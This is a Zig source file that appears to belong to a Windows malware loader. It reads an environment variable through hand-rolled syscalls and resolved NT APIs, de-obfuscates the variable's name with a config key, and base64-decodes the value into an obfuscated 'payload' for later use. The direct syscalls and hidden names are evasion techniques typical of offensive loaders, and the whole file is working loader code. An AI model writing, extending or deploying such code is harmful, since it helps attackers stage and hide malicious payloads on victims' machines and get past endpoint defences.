const std = @import("std");
const windows = std.os.windows;
const config = @import("config");
const Apis = @import("api.zig").Apis;
const Syscalls = @import("syscall.zig").Syscalls;
const win32 = @import("win32.zig");
const decodeBase64 = @import("helper/base64.zig").decodeBase64;
const mem = @import("helper/mem.zig");
const deobfsBytes = @import("helper/obfs.zig").deobfsBytes;
const string = @import("helper/string.zig");

pub fn getEnvironmentVariable(apis: Apis, syscalls: Syscalls, env_name: []const u8) ![]const u8 {
    // Prepare the environment variable name
    const env_name_w = try string.utf8ToUtf16Z(syscalls, env_name);
    defer mem.ntFreePtr(syscalls, env_name_w.ptr);
    var env_name_us: windows.UNICODE_STRING = undefined;
    apis.RtlInitUnicodeString.?(&env_name_us, @ptrCast(env_name_w.ptr));

    // Allocate buffer
    var buf_size: usize = 1024 * 1024;
    var value_buf = try mem.ntAlloc(syscalls, null, buf_size, windows.MEM_RESERVE | windows.MEM_COMMIT, windows.PAGE_READWRITE);
    defer mem.ntFree(syscalls, value_buf);
    var value_buf_w = try string.utf8ToUtf16Z(syscalls, value_buf);
    defer mem.ntFreePtr(syscalls, value_buf_w.ptr);

    var value_us: windows.UNICODE_STRING = undefined;
    value_us.Buffer = value_buf_w.ptr;
    value_us.MaximumLength = @intCast(value_buf_w.len * 2);
    value_us.Length = 0;

    var status = apis.RtlQueryEnvironmentVariable_U.?(null, &env_name_us, &value_us);
    if (@intFromEnum(status) == win32.STATUS_BUFFER_TOO_SMALL) {
        // Reallocate buffer with resizing
        mem.ntFreePtr(syscalls, value_buf_w.ptr);
        buf_size = value_us.MaximumLength / 2;
        value_buf = try mem.ntAlloc(syscalls, null, buf_size, windows.MEM_RESERVE | windows.MEM_COMMIT, windows.PAGE_READWRITE);
        value_buf_w = try string.utf8ToUtf16Z(syscalls, value_buf);
        value_us.Buffer = value_buf_w.ptr;
        value_us.MaximumLength = @intCast(value_buf_w.len);
        status = apis.RtlQueryEnvironmentVariable_U.?(null, &env_name_us, &value_us);
    }
    if (@intFromEnum(status) != win32.STATUS_SUCCESS) {
        return error.RtlQueryEnvironmentVariable_UFailed;
    }

    const value_len = value_us.Length / 2;
    const value = try string.utf16LeToUtf8(syscalls, value_buf_w[0..value_len]);
    return value[0..value_len]; // needs to be freed by caller
}

pub const EnvResult = struct {
    data: []u8,
    size: usize,
};

pub fn loadPayloadViaEnvironment(apis: Apis, syscalls: Syscalls) !EnvResult {
    const env_name = deobfsBytes(config.env_name_obfs.len, config.env_name_obfs, config.obfs_key);
    const payload_obfs_base64 = try getEnvironmentVariable(apis, syscalls, env_name[0..]);
    const payload_obfs = try decodeBase64(syscalls, payload_obfs_base64);
    return EnvResult{ .data = payload_obfs, .size = payload_obfs.len };
}
